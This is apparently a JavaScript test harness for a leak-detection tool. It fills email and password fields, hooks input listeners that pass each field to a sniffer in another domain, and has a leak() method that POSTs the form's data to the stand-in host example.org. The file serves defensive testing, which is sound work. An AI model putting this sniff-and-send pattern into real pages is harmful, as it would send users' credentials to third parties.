class LeakInspectorTest {

  static #inputListeners = {
    email: ()=>this.sniff("email"),
    password: ()=>this.sniff("password")
  }

  static reset() {
    //this.describe(""); //TODO
    this.setInputValue("email","");
    this.setInputValue("password","");
    this.#removeInputBackground("email");
    this.#removeInputBackground("password");
  }

  static describe(description) {
    this.#info(` ${description}`);
    document.getElementById("test-result-list").prependTestResult(description);
  }

  static setInputValue(id, value, fireEvent) {
    this.#trace(`.setInputValue(${id}, ${value} ${!!fireEvent ? ", fireEvent" : ""})`);
    const element = document.getElementById(id);
    if (!!!element) {
      this.#error(`.setInputValue(${id}) INPUT ELEMENT NOT FOUND`);
      return;
    }
    if (element.tagName !== "INPUT") {
      this.#error(`.setInputValue(${id}) IS NOT AN INPUT ELEMENT`);
      return;
    }
    element.value=value;
    if (!!fireEvent) {
      const event=new InputEvent("input",{inputType:"inserting",data:value});
      element.dispatchEvent(event);
    }
  }

  static setInputListener(id) {
    this.#trace(`.setInputListener(${id})`);
    const element = document.getElementById(id);
    if (!!!element) {
      this.#error(`.setInputListener(${id}) INPUT ELEMENT NOT FOUND`);
      return;
    }
    if (element.tagName !== "INPUT") {
      this.#error(`.setInputListener(${id}) IS NOT AN INPUT ELEMENT`);
      return;
    }
    if (!(id in this.#inputListeners)) {
      this.#error(`.setInputListener(${id}) HAS NO INPUT LISTENER DEFINED`);
      return;
    }
    element.addEventListener("input", this.#inputListeners[id]);
  }

  static removeInputListener(id) {
    this.#trace(`.removeInputListener(${id})`);
    const element = document.getElementById(id);
    if (!!!element) {
      this.#error(`.removeInputListener(${id}) INPUT ELEMENT NOT FOUND`);
      return;
    }
    if (element.tagName !== "INPUT") {
      this.#error(`.removeInputListener(${id}) IS NOT AN INPUT ELEMENT`);
      return;
    }
    if (!(id in this.#inputListeners)) {
      this.#error(`.removeInputListener(${id}) HAS NO INPUT LISTENER DEFINED`);
      return;
    }
    element.removeEventListener("input", this.#inputListeners[id]);
  }

  static #removeInputBackground(id) {
    this.#trace(`.removeInputBackground(${id})`);
    const element = document.getElementById(id);
    if (!!!element) {
      this.#error(`.removeInputListener(${id}) INPUT ELEMENT NOT FOUND`);
      return;
    }
    if (element.tagName !== "INPUT") {
      this.#error(`.removeInputListener(${id}) IS NOT AN INPUT ELEMENT`);
      return;
    }
    element.style.background = "";
  }

  static sniff(id) {
    this.#trace(`.sniff(${id})`);
    const element = document.getElementById(id);
    if (!!!element) {
      this.#error(`.sniff(${id}) INPUT ELEMENT NOT FOUND`);
      return;
    }
    if (element.tagName !== "INPUT") {
      this.#error(`.sniff(${id}) IS NOT AN INPUT ELEMENT`);
      return;
    }
    LeakInspectorOtherDomain.sniff(element);
  }

  static leak(id) {
    this.#trace(`.leak(${id})`);
    const element = document.getElementById(id);
    if (!!!element) {
      this.#error(`.leak(${id}) FORM ELEMENT NOT FOUND`);
      return;
    }
    if (element.tagName !== "FORM") {
      this.#error(`.leak(${id}) IS NOT A FORM ELEMENT`);
      return;
    }
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "http://example.org");
    xhr.setRequestHeader("Content-Type", "multipart/form-data"); 
    const formData = new FormData(element);
    this.#trace(`.Leak(${id}) ${Array.from(formData.values())}`);
    LeakInspectorOtherDomain.leak(xhr, formData);
  }

  static promptForTestResult() {
    let done = result => {};
    const passListener = () => done("pass");
    const failListener = () => done("fail");
    const testResultPrompt = document.getElementById("test-result-prompt");
    const passButton = testResultPrompt.querySelector(".pass");
    const failButton = testResultPrompt.querySelector(".fail");
    passButton.addEventListener("click", passListener);
    failButton.addEventListener("click", failListener);
    testResultPrompt.classList.remove("hidden");
    return new Promise(resolve => {
      done = result => {
        testResultPrompt.classList.add("hidden");
        passButton.removeEventListener("click", passListener);
        failButton.removeEventListener("click", failListener);
        resolve(result);
      };
    });
  }

  static #error(source) {
    console.error(`LeakInspectorTest${source}`);
  }

  static #info(source) {
    console.info(`LeakInspectorTest${source}`);
  }

  static #trace(source) {
    console.debug(`LeakInspectorTest${source}`);
  }

}